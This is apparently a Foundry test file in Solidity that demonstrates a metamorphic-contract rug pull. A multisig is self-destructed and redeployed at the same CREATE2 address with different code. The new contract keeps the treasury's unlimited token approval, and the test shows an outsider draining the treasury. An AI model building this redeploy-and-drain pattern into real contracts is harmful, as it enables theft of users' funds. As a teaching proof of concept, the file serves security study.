// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {MetamorphicFactory} from "./MetamorphicFactory.sol";
import {Multisig} from "./Multisig.sol";
import {Multisig2} from "./Multisig2.sol";
import {Treasury} from "./Treasury.sol";
import {Destroy} from "./Destroy.sol";
import "./TreasuryToken.sol";

contract MetamorphicRug is Test {
	TreasuryToken public token;
	MetamorphicFactory public factoryContract;
	address public multisigAddr;
	address public treasuryAddr;

	function setUp() public {
		factoryContract = new MetamorphicFactory();
		bytes memory bytecode = abi.encodePacked(vm.getCode("Multisig.sol"));
		multisigAddr =  factoryContract.deploy(1, bytecode);

		// initialize multisig owner
		address multisigOwner = address(1234);
		vm.prank(multisigOwner);
		Multisig(multisigAddr).initialize();

		// Never make assertions in the setUp function. Failed assertions won't result with failed test.
		// But if the test fails, failed assert will be visible
		// https://book.getfoundry.sh/tutorials/best-practices?highlight=setup#general-test-guidance
		assertEq(Multisig(multisigAddr).owner(), multisigOwner);

		// deploy treasury token
		token = new TreasuryToken();

		treasuryAddr = address(new Treasury());
		vm.prank(multisigAddr);
		Treasury(treasuryAddr).initialize(token);
		assertEq(Treasury(treasuryAddr).owner(), multisigAddr);

		// The selfdestruct call must be done in setUp() due to a foundry limitation: https://github.com/foundry-rs/foundry/issues/1543
		address destroyAddr = address(new Destroy());
		vm.prank(multisigOwner);
		Multisig(multisigAddr).transferFromContract(destroyAddr);

		// mine some blocks
		vm.roll(block.number + 10);
	}

	// deploy new multisig with different contract which will drain all the funds from treasury
	function testMetamorphicRug() public {
		// treasury set infinite approve to multisig contract
		assertEq(token.allowance(treasuryAddr, multisigAddr), type(uint256).max);

		// deploy new multisig with different code but with the same address
		bytes memory bytecode = abi.encodePacked(vm.getCode("Multisig2.sol"));
		address newMultisigAddr =  factoryContract.deploy(1, bytecode);
		assertEq(newMultisigAddr, multisigAddr);
		assertEq(Treasury(treasuryAddr).owner(), newMultisigAddr);

		// treasury has some tokens
		token.mint(treasuryAddr, 1 ether);
		assertEq(token.balanceOf(treasuryAddr), 1 ether);
		// new multisig contract still has infinite approve from treasury
		assertEq(token.allowance(treasuryAddr, multisigAddr), type(uint256).max);

		// bob can initialize new multisig with him as owner
		address bob = address(99);
		vm.prank(bob);
		Multisig2(multisigAddr).initialize();
		assertEq(Multisig(multisigAddr).owner(), bob);

		// new multisig contract can transfer all funds from treasury to owner
		vm.prank(bob);
		Multisig2(multisigAddr).transferFromTreasury(treasuryAddr);
		assertEq(token.balanceOf(treasuryAddr), 0 ether);
		// this is possible because treasury set infinite approve to multisig contract
		assertEq(token.balanceOf(bob), 1 ether);
	}

	// deploying the same contract with the same salt will produce the same address
	function testTheSameContract() public {
		bytes memory bytecode = abi.encodePacked(vm.getCode("Multisig.sol"));
		address newMultisigAddr = factoryContract.deploy(1, bytecode);
		assertEq(newMultisigAddr, multisigAddr);
	}

	// deploying the different contract with the same salt will produce the same address
	function testDifferentContract() public {
		bytes memory bytecode = abi.encodePacked(vm.getCode("Multisig2.sol"));
		address newMultisigAddr =  factoryContract.deploy(1, bytecode);
		assertEq(newMultisigAddr, multisigAddr);
	}

	// deploying the same contract but with a different salt will produce a different address
	function testDifferentSalt() public {
		bytes memory bytecode = abi.encodePacked(vm.getCode("Multisig.sol"));
		address newMultisigAddr =  factoryContract.deploy(2, bytecode);

		// different salt will produce different address
		assertTrue(multisigAddr != newMultisigAddr);
	}
}
